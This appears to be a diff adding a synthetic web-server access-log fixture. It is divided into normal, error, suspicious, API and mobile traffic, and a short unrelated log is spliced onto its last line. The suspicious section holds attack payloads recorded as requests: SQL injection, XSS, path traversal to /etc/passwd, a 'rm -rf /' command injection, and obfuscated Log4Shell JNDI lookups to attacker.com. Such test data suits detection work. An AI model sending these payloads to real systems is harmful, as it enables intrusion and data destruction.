@@ -1,0 +1,114 @@
+# Normal Traffic (30 entries)
+192.168.1.10 - - [12/May/2023:00:01:00 +0000] "GET / HTTP/1.1" 200 4372
+192.168.1.11 - - [12/May/2023:00:02:15 +0000] "GET /styles.css HTTP/1.1" 200 1432
+192.168.1.12 - - [12/May/2023:00:03:30 +0000] "GET /script.js HTTP/1.1" 200 3210
+192.168.1.13 - - [12/May/2023:00:04:45 +0000] "GET /images/logo.png HTTP/1.1" 200 5432
+192.168.1.14 - - [12/May/2023:00:05:00 +0000] "GET /products HTTP/1.1" 200 7321
+192.168.1.15 - - [12/May/2023:00:06:15 +0000] "GET /products/123 HTTP/1.1" 200 6210
+192.168.1.16 - - [12/May/2023:00:07:30 +0000] "GET /contact HTTP/1.1" 200 4321
+192.168.1.17 - - [12/May/2023:00:08:45 +0000] "POST /login HTTP/1.1" 302 342
+192.168.1.18 - - [12/May/2023:00:09:00 +0000] "GET /account HTTP/1.1" 200 5432
+192.168.1.19 - - [12/May/2023:00:10:15 +0000] "GET /cart HTTP/1.1" 200 3210
+192.168.1.20 - - [12/May/2023:00:11:30 +0000] "POST /checkout HTTP/1.1" 201 1024
+192.168.1.21 - - [12/May/2023:00:12:45 +0000] "GET /order/123 HTTP/1.1" 200 6210
+192.168.1.22 - - [12/May/2023:00:13:00 +0000] "GET /search?q=shoes HTTP/1.1" 200 4321
+192.168.1.23 - - [12/May/2023:00:14:15 +0000] "GET /robots.txt HTTP/1.1" 200 123
+192.168.1.24 - - [12/May/2023:00:15:30 +0000] "GET /sitemap.xml HTTP/1.1" 200 5432
+192.168.1.25 - - [12/May/2023:00:16:45 +0000] "GET /favicon.ico HTTP/1.1" 200 3210
+192.168.1.26 - - [12/May/2023:00:17:00 +0000] "GET /about HTTP/1.1" 200 4321
+192.168.1.27 - - [12/May/2023:00:18:15 +0000] "GET /privacy HTTP/1.1" 200 5432
+192.168.1.28 - - [12/May/2023:00:19:30 +0000] "GET /terms HTTP/1.1" 200 3210
+192.168.1.29 - - [12/May/2023:00:20:45 +0000] "GET /blog HTTP/1.1" 200 4321
+192.168.1.30 - - [12/May/2023:00:21:00 +0000] "GET /blog/1 HTTP/1.1" 200 5432
+192.168.1.31 - - [12/May/2023:00:22:15 +0000] "GET /blog/2 HTTP/1.1" 200 3210
+192.168.1.32 - - [12/May/2023:00:23:30 +0000] "GET /blog/3 HTTP/1.1" 200 4321
+192.168.1.33 - - [12/May/2023:00:24:45 +0000] "GET /api/products HTTP/1.1" 200 5432
+192.168.1.34 - - [12/May/2023:00:25:00 +0000] "GET /api/users HTTP/1.1" 200 3210
+192.168.1.35 - - [12/May/2023:00:26:15 +0000] "GET /healthcheck HTTP/1.1" 200 4321
+192.168.1.36 - - [12/May/2023:00:27:30 +0000] "HEAD / HTTP/1.1" 200 0
+192.168.1.37 - - [12/May/2023:00:28:45 +0000] "OPTIONS / HTTP/1.1" 200 0
+192.168.1.38 - - [12/May/2023:00:29:00 +0000] "GET /assets/image.jpg HTTP/1.1" 200 5432
+192.168.1.39 - - [12/May/2023:00:30:15 +0000] "GET /assets/style.css HTTP/1.1" 200 3210
+
+# Error Cases (20 entries)
+192.168.1.40 - - [12/May/2023:00:31:30 +0000] "GET /nonexistent-page HTTP/1.1" 404 189
+192.168.1.41 - - [12/May/2023:00:32:45 +0000] "GET /old-page HTTP/1.1" 410 234
+192.168.1.42 - - [12/May/2023:00:33:00 +0000] "POST /login HTTP/1.1" 401 342
+192.168.1.43 - - [12/May/2023:00:34:15 +0000] "GET /admin HTTP/1.1" 403 294
+192.168.1.44 - - [12/May/2023:00:35:30 +0000] "GET /wp-admin HTTP/1.1" 403 294
+192.168.1.45 - - [12/May/2023:00:36:45 +0000] "POST /api/payment HTTP/1.1" 500 432
+192.168.1.46 - - [12/May/2023:00:37:00 +0000] "GET /api/users/999 HTTP/1.1" 404 189
+192.168.1.47 - - [12/May/2023:00:38:15 +0000] "PUT /api/products/999 HTTP/1.1" 404 189
+192.168.1.48 - - [12/May/2023:00:39:30 +0000] "DELETE /api/orders/999 HTTP/1.1" 404 189
+192.168.1.49 - - [12/May/2023:00:40:45 +0000] "GET /%20%20%20 HTTP/1.1" 400 234
+192.168.1.50 - - [12/May/2023:00:41:00 +0000] "GET /../../etc/passwd HTTP/1.1" 400 234
+192.168.1.51 - - [12/May/2023:00:42:15 +0000] "POST /api/login HTTP/1.1" 422 342
+192.168.1.52 - - [12/May/2023:00:43:30 +0000] "GET /api/orders HTTP/1.1" 503 432
+192.168.1.53 - - [12/May/2023:00:44:45 +0000] "GET /api/products HTTP/1.1" 502 432
+192.168.1.54 - - [12/May/2023:00:45:00 +0000] "GET /api/users HTTP/1.1" 504 432
+192.168.1.55 - - [12/May/2023:00:46:15 +0000] "CONNECT /proxy HTTP/1.1" 502 312
+192.168.1.56 - - [12/May/2023:00:47:30 +0000] "GET / HTTP/1.0" 505 234
+192.168.1.57 - - [12/May/2023:00:48:45 +0000] "GET /%zz HTTP/1.1" 400 234
+192.168.1.58 - - [12/May/2023:00:49:00 +0000] "POST /api/orders HTTP/1.1" 429 342
+192.168.1.59 - - [12/May/2023:00:50:15 +0000] "GET /search?q=<script> HTTP/1.1" 400 234
+
+# Suspicious Activity (20 entries)
+203.0.113.1 - - [12/May/2023:00:51:30 +0000] "GET /wp-login.php HTTP/1.1" 404 189
+203.0.113.2 - - [12/May/2023:00:52:45 +0000] "POST /wp-login.php HTTP/1.1" 404 189
+203.0.113.3 - - [12/May/2023:00:53:00 +0000] "GET /adminer.php HTTP/1.1" 404 189
+203.0.113.4 - - [12/May/2023:00:54:15 +0000] "GET /phpmyadmin HTTP/1.1" 404 189
+203.0.113.5 - - [12/May/2023:00:55:30 +0000] "GET /.env HTTP/1.1" 403 294
+203.0.113.6 - - [12/May/2023:00:56:45 +0000] "GET /config.php HTTP/1.1" 403 294
+203.0.113.7 - - [12/May/2023:00:57:00 +0000] "GET /backup.zip HTTP/1.1" 404 189
+203.0.113.8 - - [12/May/2023:00:58:15 +0000] "GET /?param=<script>alert(1)</script> HTTP/1.1" 400 234
+203.0.113.9 - - [12/May/2023:00:59:30 +0000] "GET /?PHPSESSID=maliciouscode HTTP/1.1" 400 234
+203.0.113.10 - - [12/May/2023:01:00:45 +0000] "GET /?id=1%20OR%201=1 HTTP/1.1" 400 234
+203.0.113.11 - - [12/May/2023:01:01:00 +0000] "GET /?id=1%20UNION%20SELECT%20*%20FROM%20users HTTP/1.1" 400 234
+203.0.113.12 - - [12/May/2023:01:02:15 +0000] "GET /?id=1;DROP%20TABLE%20users HTTP/1.1" 400 234
+203.0.113.13 - - [12/May/2023:01:03:30 +0000] "GET /?cmd=rm%20-rf%20/ HTTP/1.1" 400 234
+203.0.113.14 - - [12/May/2023:01:04:45 +0000] "GET /?file=../../../../etc/passwd HTTP/1.1" 400 234
+203.0.113.15 - - [12/May/2023:01:05:00 +0000] "GET /?${jndi:ldap://attacker.com/a} HTTP/1.1" 400 234
+203.0.113.16 - - [12/May/2023:01:06:15 +0000] "GET /?${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//attacker.com/a} HTTP/1.1" 400 234
+203.0.113.17 - - [12/May/2023:01:07:30 +0000] "GET /?name=*|expr* HTTP/1.1" 400 234
+203.0.113.18 - - [12/May/2023:01:08:45 +0000] "GET /?q=1%20AND%201=CONVERT(int,%20@@version) HTTP/1.1" 400 234
+203.0.113.19 - - [12/May/2023:01:09:00 +0000] "GET /?q=1%20AND%201=1%20-- HTTP/1.1" 400 234
+203.0.113.20 - - [12/May/2023:01:10:15 +0000] "GET /?q=1%27%20OR%20%271%27=%271 HTTP/1.1" 400 234
+
+# API Traffic (15 entries)
+192.168.2.1 - - [12/May/2023:01:11:30 +0000] "GET /api/v1/products HTTP/1.1" 200 5432
+192.168.2.2 - - [12/May/2023:01:12:45 +0000] "GET /api/v1/products/123 HTTP/1.1" 200 4321
+192.168.2.3 - - [12/May/2023:01:13:00 +0000] "POST /api/v1/orders HTTP/1.1" 201 1024
+192.168.2.4 - - [12/May/2023:01:14:15 +0000] "PUT /api/v1/orders/123 HTTP/1.1" 200 6210
+192.168.2.5 - - [12/May/2023:01:15:30 +0000] "DELETE /api/v1/orders/123 HTTP/1.1" 204 0
+192.168.2.6 - - [12/May/2023:01:16:45 +0000] "GET /api/v1/users HTTP/1.1" 200 5432
+192.168.2.7 - - [12/May/2023:01:17:00 +0000] "GET /api/v1/users/me HTTP/1.1" 200 4321
+192.168.2.8 - - [12/May/2023:01:18:15 +0000] "PATCH /api/v1/users/me HTTP/1.1" 200 6210
+192.168.2.9 - - [12/May/2023:01:19:30 +0000] "GET /api/v1/cart HTTP/1.1" 200 5432
+192.168.2.10 - - [12/May/2023:01:20:45 +0000] "POST /api/v1/cart/items HTTP/1.1" 201 1024
+192.168.2.11 - - [12/May/2023:01:21:00 +0000] "DELETE /api/v1/cart/items/123 HTTP/1.1" 204 0
+192.168.2.12 - - [12/May/2023:01:22:15 +0000] "GET /api/v1/search?q=shoes HTTP/1.1" 200 4321
+192.168.2.13 - - [12/May/2023:01:23:30 +0000] "GET /api/v1/healthcheck HTTP/1.1" 200 123
+192.168.2.14 - - [12/May/2023:01:24:45 +0000] "HEAD /api/v1/ HTTP/1.1" 200 0
+192.168.2.15 - - [12/May/2023:01:25:00 +0000] "OPTIONS /api/v1/ HTTP/1.1" 200 0
+
+# Mobile Traffic (15 entries)
+192.168.3.1 - Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) [12/May/2023:01:26:15 +0000] "GET /mobile HTTP/1.1" 200 5432
+192.168.3.2 - Mozilla/5.0 (iPad; CPU OS 15_0 like Mac OS X) [12/May/2023:01:27:30 +0000] "GET /products HTTP/1.1" 200 4321
+192.168.3.3 - Mozilla/5.0 (Linux; Android 12; SM-G991B) [12/May/2023:01:28:45 +0000] "GET / HTTP/1.1" 200 4372
+192.168.3.4 - Mozilla/5.0 (Linux; Android 12; SM-G991B) [12/May/2023:01:29:00 +0000] "GET /app-ads.txt HTTP/1.1" 200 123
+192.168.3.5 - Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) [12/May/2023:01:30:15 +0000] "POST /api/mobile/login HTTP/1.1" 200 6210
+192.168.3.6 - Dalvik/2.1.0 (Linux; U; Android 9; SM-G960F Build/PPR1.180610.011) [12/May/2023:01:31:30 +0000] "GET /api/android/v1/config HTTP/1.1" 200 4321
+192.168.3.7 - Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) [12/May/2023:01:32:45 +0000] "GET /api/ios/v1/config HTTP/1.1" 200 4321
+192.168.3.8 - Mozilla/5.0 (Linux; Android 12; SM-G991B) [12/May/2023:01:33:00 +0000] "GET /.well-known/assetlinks.json HTTP/1.1" 200 5432
+192.168.3.9 - Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) [12/May/2023:01:34:15 +0000] "GET /.well-known/apple-app-site-association HTTP/1.1" 200 5432
+192.168.3.10 - Mozilla/5.0 (Linux; Android 12; SM-G991B) [12/May/2023:01:35:30 +0000] "GET /manifest.json HTTP/1.1" 200 4321
+192.168.3.11 - Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) [12/May/2023:01:36:45 +0000] "GET /service-worker.js HTTP/1.1" 200 4321
+192.168.3.12 - Mozilla/5.0 (Linux; Android 12; SM-G991B) [12/May/2023:01:37:00 +0000] "GET /push-notifications HTTP/1.1" 200 5432
+192.168.3.13 - Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) [12/May/2023:01:38:15 +0000] "POST /api/mobile/push-token HTTP/1.1" 201 1024
+192.168.3.14 - Dalvik/2.1.0 (Linux; U; Android 9; SM-G960F Build/PPR1.180610.011) [12/May/2023:01:39:30 +0000] "GET /api/android/v1/version HTTP/1.1" 200 4321
+192.168.3.15 - Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) [12/May/2023:01:40:45 +0000] "GET /api/ios/v1/version HTTP/1.1" 200 4321192.168.1.1 - - [10/May/2023:14:30:00 +0000] "GET /index.html HTTP/1.1" 200 1234
+192.168.1.2 - - [10/May/2023:14:31:00 +0000] "POST /login HTTP/1.1" 200 5678
+192.168.1.1 - - [10/May/2023:14:32:00 +0000] "GET /about.html HTTP/1.1" 404 123
+192.168.1.3 - - [10/May/2023:15:00:00 +0000] "GET /contact.html HTTP/1.1" 200 4321
+192.168.1.2 - - [11/May/2023:09:15:00 +0000] "POST /submit HTTP/1.1" 500 345
+192.168.1.1 - - [11/May/2023:10:00:00 +0000] "GET /index.html HTTP/1.1" 200 1234
